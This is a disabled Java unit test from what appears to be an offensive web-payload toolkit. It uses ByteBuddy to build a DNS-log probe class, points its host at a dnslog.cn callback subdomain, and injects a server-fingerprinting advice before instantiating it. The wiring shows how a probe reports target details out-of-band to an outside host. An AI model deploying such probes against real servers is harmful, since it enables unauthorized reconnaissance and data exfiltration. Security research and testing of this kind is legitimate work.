package com.reajason.javaweb.probe.payload.dns;

import com.reajason.javaweb.probe.payload.ServerProbe;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/8/1
 */
class ServerDnsLogTest {

    @Test
    @Disabled
    @SneakyThrows
    void test() {
        Class<? extends DnsLogServer> loaded = new ByteBuddy()
                .redefine(DnsLogServer.class)
                .name("ServerDnsLogTest1")
                .field(named("host")).value("ixdcn4.dnslog.cn")
                .visit(Advice.to(ServerProbe.class).on(named("getServer")))
                .make().load(getClass().getClassLoader()).getLoaded();
        loaded.getDeclaredConstructor().newInstance();
    }
}